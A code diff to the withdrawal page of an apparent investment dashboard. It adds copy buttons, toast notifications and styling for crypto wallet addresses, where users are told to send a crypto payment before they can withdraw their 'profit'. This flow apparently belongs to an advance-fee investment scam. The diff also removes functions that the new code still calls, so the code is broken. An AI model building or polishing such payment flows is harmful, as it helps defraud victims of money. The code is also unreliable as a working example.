@@ -52,6 +52,10 @@
     </div>
     <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
 </div>
+<!-- Toast Container -->
+<div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 9999;">
+    <!-- Toasts will be dynamically inserted here -->
+</div>
 <style>
     .kyc-banner {
         margin: 20px auto;
@@ -600,161 +604,246 @@ function initializeChart(initialInvestment = 0) {
         }
     }
 
-    function showCryptoWithdrawalDetails() {
-        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
-        const paymentDetails = document.getElementById('withdrawalPaymentDetails');
-        
-        let cryptoOptionsHtml = '';
-        for (const [key, address] of Object.entries(WITHDRAWAL_CRYPTO_ADDRESSES)) {
-            const iconClass = key === 'BTC' ? 'btc' : (key === 'USDT_ERC20' ? 'erc20' : 'trc20');
-            cryptoOptionsHtml += `
-                <div class="form-check mb-3">
-                    <input class="form-check-input" type="radio" name="cryptoType" 
-                           id="withdrawalCrypto${key}" value="${key}" onchange="selectWithdrawalCrypto('${key}')">
-                    <label class="form-check-label" for="withdrawalCrypto${key}">
-                        <div class="d-flex align-items-center">
-                            <i class="${WITHDRAWAL_CRYPTO_ICONS[key]} crypto-icon ${iconClass} me-2"></i>
-                            <div>
-                                <strong>${WITHDRAWAL_CRYPTO_NAMES[key]}</strong><br>
-                                <small class="text-muted">${address}</small>
+   function showCryptoWithdrawalDetails() {
+    const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+    const paymentDetails = document.getElementById('withdrawalPaymentDetails');
+    
+    let cryptoOptionsHtml = '';
+    for (const [key, address] of Object.entries(WITHDRAWAL_CRYPTO_ADDRESSES)) {
+        const iconClass = key === 'BTC' ? 'btc' : (key === 'USDT_ERC20' ? 'erc20' : 'trc20');
+        cryptoOptionsHtml += `
+            <div class="form-check mb-3">
+                <input class="form-check-input" type="radio" name="cryptoType" 
+                       id="withdrawalCrypto${key}" value="${key}" onchange="selectWithdrawalCrypto('${key}')">
+                <label class="form-check-label" for="withdrawalCrypto${key}">
+                    <div class="d-flex align-items-center">
+                        <i class="${WITHDRAWAL_CRYPTO_ICONS[key]} crypto-icon ${iconClass} me-2"></i>
+                        <div class="flex-grow-1">
+                            <strong>${WITHDRAWAL_CRYPTO_NAMES[key]}</strong><br>
+                            <div class="d-flex align-items-center mt-1">
+                                <small class="text-muted crypto-address" id="cryptoAddress${key}" style="
+                                    font-family: 'Courier New', monospace;
+                                    font-size: 0.85rem;
+                                    word-break: break-all;
+                                    background: #f8f9fa;
+                                    padding: 4px 8px;
+                                    border-radius: 4px;
+                                    border: 1px solid #dee2e6;
+                                ">${address}</small>
+                                <button type="button" class="btn btn-sm btn-outline-primary ms-2 copy-address-btn" 
+                                        onclick="copyCryptoAddress('${address}', '${key}', this)"
+                                        style="
+                                            padding: 2px 8px;
+                                            font-size: 0.75rem;
+                                            transition: all 0.2s;
+                                        ">
+                                    <i class="fas fa-copy"></i>
+                                </button>
                             </div>
                         </div>
-                    </label>
-                </div>
-            `;
-        }
-        
-        paymentDetails.innerHTML = `
-            <div class="alert alert-info">
-                <h5><i class="fas fa-coins"></i> Cryptocurrency Payment</h5>
-                <p>Send $${window.withdrawalData.requiredUsd.toFixed(2)} USD worth of cryptocurrency to withdraw your profit of $${window.withdrawalData.profitAmount.toFixed(2)}.</p>
-                <p><strong>Important:</strong> Make sure to use the correct network (ERC20 vs TRC20 for USDT).</p>
-            </div>
-            
-            <div class="mb-3">
-                <label class="form-label"><strong>Select Cryptocurrency:</strong></label>
-                ${cryptoOptionsHtml}
-            </div>
-            
-            <div class="mb-3">
-                <label for="cryptoScreenshot" class="form-label">
-                    <strong><i class="fas fa-camera"></i> Upload Payment Screenshot:</strong>
+                    </div>
                 </label>
-                <input type="file" class="form-control" id="cryptoScreenshot" accept="image/*">
-                <div class="form-text">Take a screenshot of your crypto wallet showing the completed transaction</div>
-                <div id="cryptoPreview" class="mt-2"></div>
-            </div>
-            
-            <div class="mb-3">
-                <label for="cryptoTransactionId" class="form-label">
-                    <strong><i class="fas fa-receipt"></i> Transaction Hash/ID:</strong>
-                </label>
-                <input type="text" class="form-control" id="cryptoTransactionId" 
-                       placeholder="Enter your crypto transaction hash/ID">
             </div>
         `;
-        
-        proceedBtn.style.display = 'inline-block';
-        proceedBtn.textContent = 'Submit Crypto Payment';
-        proceedBtn.className = 'btn btn-success';
-        proceedBtn.onclick = submitCryptoWithdrawalPayment;
-        
-        // Setup screenshot preview
-        document.getElementById('cryptoScreenshot').onchange = function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    document.getElementById('cryptoPreview').innerHTML = `
-                        <img src="${event.target.result}" class="img-thumbnail" style="max-height: 150px;">
-                        <button type="button" class="btn btn-sm btn-danger mt-2" onclick="clearCryptoPreview()">
-                            <i class="fas fa-trash"></i> Remove
-                        </button>
-                    `;
-                };
-                reader.readAsDataURL(file);
-            }
-        };
     }
-
-    function selectWithdrawalCrypto(type) {
-        window.withdrawalData.cryptoType = type;
-    }
-
-    function clearCryptoPreview() {
-        document.getElementById('cryptoScreenshot').value = '';
-        document.getElementById('cryptoPreview').innerHTML = '';
-    }
-
-    async function submitCryptoWithdrawalPayment() {
-        const cryptoType = document.querySelector('input[name="cryptoType"]:checked');
-        const screenshotInput = document.getElementById('cryptoScreenshot');
-        const transactionId = document.getElementById('cryptoTransactionId').value.trim();
+    
+    paymentDetails.innerHTML = `
+        <div class="alert alert-info">
+            <h5><i class="fas fa-coins"></i> Cryptocurrency Payment</h5>
+            <p>Send $${window.withdrawalData.requiredUsd.toFixed(2)} USD worth of cryptocurrency to withdraw your profit of $${window.withdrawalData.profitAmount.toFixed(2)}.</p>
+            <p><strong>Important:</strong> Make sure to use the correct network (ERC20 vs TRC20 for USDT).</p>
+        </div>
         
-        if (!cryptoType) {
-            alert('Please select a cryptocurrency');
-            return;
+        <div class="mb-3">
+            <label class="form-label"><strong>Select Cryptocurrency:</strong></label>
+            ${cryptoOptionsHtml}
+        </div>
+        
+        <div class="mb-3">
+            <label for="cryptoScreenshot" class="form-label">
+                <strong><i class="fas fa-camera"></i> Upload Payment Screenshot:</strong>
+            </label>
+            <input type="file" class="form-control" id="cryptoScreenshot" accept="image/*">
+            <div class="form-text">Take a screenshot of your crypto wallet showing the completed transaction</div>
+            <div id="cryptoPreview" class="mt-2"></div>
+        </div>
+        
+        <div class="mb-3">
+            <label for="cryptoTransactionId" class="form-label">
+                <strong><i class="fas fa-receipt"></i> Transaction Hash/ID:</strong>
+            </label>
+            <input type="text" class="form-control" id="cryptoTransactionId" 
+                   placeholder="Enter your crypto transaction hash/ID">
+        </div>
+    `;
+    
+    proceedBtn.style.display = 'inline-block';
+    proceedBtn.textContent = 'Submit Crypto Payment';
+    proceedBtn.className = 'btn btn-success';
+    proceedBtn.onclick = submitCryptoWithdrawalPayment;
+    
+    // Setup screenshot preview
+    document.getElementById('cryptoScreenshot').onchange = function(e) {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                document.getElementById('cryptoPreview').innerHTML = `
+                    <img src="${event.target.result}" class="img-thumbnail" style="max-height: 150px;">
+                    <button type="button" class="btn btn-sm btn-danger mt-2" onclick="clearCryptoPreview()">
+                        <i class="fas fa-trash"></i> Remove
+                    </button>
+                `;
+            };
+            reader.readAsDataURL(file);
         }
+    };
+}
+
+// Function to copy crypto address
+function copyCryptoAddress(address, cryptoType, button) {
+    const originalHtml = button.innerHTML;
+    
+    // Use the modern Clipboard API
+    navigator.clipboard.writeText(address).then(() => {
+        // Success feedback
+        button.innerHTML = '<i class="fas fa-check"></i>';
+        button.classList.remove('btn-outline-primary');
+        button.classList.add('btn-success');
         
-        if (!screenshotInput.files[0]) {
-            alert('Please upload a payment screenshot');
-            return;
-        }
+        // Show toast notification
+        showCopyToast(cryptoType);
         
-        if (!transactionId) {
-            alert('Please enter your transaction hash/ID');
-            return;
-        }
+        // Reset button after 2 seconds
+        setTimeout(() => {
+            button.innerHTML = originalHtml;
+            button.classList.remove('btn-success');
+            button.classList.add('btn-outline-primary');
+        }, 2000);
         
-        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
-        const originalText = proceedBtn.innerHTML;
-        proceedBtn.disabled = true;
-        proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Processing...';
+    }).catch(err => {
+        // Fallback for older browsers
+        console.error('Clipboard API failed:', err);
+        fallbackCopyToClipboard(address, button, cryptoType);
+    });
+}
+
+// Fallback method for older browsers
+function fallbackCopyToClipboard(text, button, cryptoType) {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    textArea.style.position = 'fixed';
+    textArea.style.left = '-999999px';
+    textArea.style.top = '-999999px';
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+        const successful = document.execCommand('copy');
+        const originalHtml = button.innerHTML;
         
-        // Read screenshot as base64
-        const file = screenshotInput.files[0];
-        const reader = new FileReader();
-        
-        reader.onload = async function(event) {
-            const base64Screenshot = event.target.result;
+        if (successful) {
+            button.innerHTML = '<i class="fas fa-check"></i>';
+            button.classList.remove('btn-outline-primary');
+            button.classList.add('btn-success');
             
-            try {
-                const response = await fetch('/submit_withdrawal_crypto_payment', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount_usd: window.withdrawalData.requiredUsd,
-                        crypto_type: cryptoType.value,
-                        wallet_address: WITHDRAWAL_CRYPTO_ADDRESSES[cryptoType.value],
-                        transaction_id: transactionId,
-                        payment_screenshot: base64Screenshot,
-                        country: window.withdrawalData.country,
-                        profit_amount: window.withdrawalData.profitAmount
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.status === 'success') {
-                    alert('Crypto payment submitted successfully! Your withdrawal is pending approval.');
-                    const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawalModal'));
-                    modal.hide();
-                    window.location.href = '/dashboard';
-                } else {
-                    alert(data.message || 'Submission failed. Please try again.');
-                    proceedBtn.disabled = false;
-                    proceedBtn.innerHTML = originalText;
-                }
-            } catch (error) {
-                alert('Network error. Please try again.');
-                proceedBtn.disabled = false;
-                proceedBtn.innerHTML = originalText;
-            }
-        };
-        
-        reader.readAsDataURL(file);
+            // Show toast
+            showCopyToast(cryptoType);
+            
+            setTimeout(() => {
+                button.innerHTML = originalHtml;
+                button.classList.remove('btn-success');
+                button.classList.add('btn-outline-primary');
+            }, 2000);
+        } else {
+            showCopyErrorToast(cryptoType);
+        }
+    } catch (err) {
+        console.error('Fallback copy failed:', err);
+        showCopyErrorToast(cryptoType);
     }
+    
+    document.body.removeChild(textArea);
+}
 
+// Show success toast notification
+function showCopyToast(cryptoType) {
+    // Create toast element
+    const toastId = 'copyToast' + Date.now();
+    const toastHtml = `
+        <div class="toast align-items-center text-bg-success border-0" role="alert" aria-live="assertive" aria-atomic="true" id="${toastId}">
+            <div class="d-flex">
+                <div class="toast-body">
+                    <i class="fas fa-check-circle me-2"></i>
+                    ${cryptoType} address copied to clipboard!
+                </div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+            </div>
+        </div>
+    `;
+    
+    // Add toast to toast container
+    const toastContainer = document.querySelector('.toast-container');
+    if (toastContainer) {
+        toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    } else {
+        // Fallback: add to body
+        document.body.insertAdjacentHTML('beforeend', toastHtml);
+    }
+    
+    // Show toast
+    const toastEl = document.getElementById(toastId);
+    if (toastEl) {
+        const toast = new bootstrap.Toast(toastEl, {
+            autohide: true,
+            delay: 3000
+        });
+        toast.show();
+        
+        // Remove toast after it's hidden
+        toastEl.addEventListener('hidden.bs.toast', function () {
+            toastEl.remove();
+        });
+    }
+}
+
+// Show error toast notification
+function showCopyErrorToast(cryptoType) {
+    const toastId = 'copyErrorToast' + Date.now();
+    const toastHtml = `
+        <div class="toast align-items-center text-bg-danger border-0" role="alert" aria-live="assertive" aria-atomic="true" id="${toastId}">
+            <div class="d-flex">
+                <div class="toast-body">
+                    <i class="fas fa-exclamation-circle me-2"></i>
+                    Failed to copy ${cryptoType} address. Please select and copy manually.
+                </div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+            </div>
+        </div>
+    `;
+    
+    const toastContainer = document.querySelector('.toast-container');
+    if (toastContainer) {
+        toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    } else {
+        document.body.insertAdjacentHTML('beforeend', toastHtml);
+    }
+    
+    const toastEl = document.getElementById(toastId);
+    if (toastEl) {
+        const toast = new bootstrap.Toast(toastEl, {
+            autohide: true,
+            delay: 5000
+        });
+        toast.show();
+        
+        toastEl.addEventListener('hidden.bs.toast', function () {
+            toastEl.remove();
+        });
+    }
+}
+      
     function showCardWithdrawalDetails() {
         const proceedBtn = document.getElementById('proceedWithdrawalBtn');
         const paymentDetails = document.getElementById('withdrawalPaymentDetails');
@@ -1039,6 +1128,72 @@ function initializeChart(initialInvestment = 0) {
         }
     }
 </script>
+<style>
+    /* Copy button styling */
+    .copy-address-btn {
+        padding: 2px 8px;
+        font-size: 0.75rem;
+        transition: all 0.2s;
+    }
+    
+    .copy-address-btn:hover {
+        transform: scale(1.1);
+        background-color: #0d6efd;
+        color: white;
+    }
+    
+    /* Crypto address text styling */
+    .crypto-address {
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+        word-break: break-all;
+        background: #f8f9fa;
+        padding: 4px 8px;
+        border-radius: 4px;
+        border: 1px solid #dee2e6;
+        max-width: 300px;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+    
+    /* Toast positioning */
+    .toast-container {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 9999;
+    }
+    
+    /* Crypto icons styling */
+    .crypto-icon {
+        font-size: 1.5rem;
+    }
+    
+    .crypto-icon.btc {
+        color: #F7931A;
+    }
+    
+    .crypto-icon.erc20 {
+        color: #26A17B;
+    }
+    
+    .crypto-icon.trc20 {
+        color: #FF6B01;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+        .crypto-address {
+            font-size: 0.75rem;
+            max-width: 200px;
+        }
+        
+        .copy-address-btn {
+            padding: 1px 6px;
+            font-size: 0.7rem;
+        }
+    }
+</style>
 <style>
     /* Payment option cards styling */
     .payment-option-card {
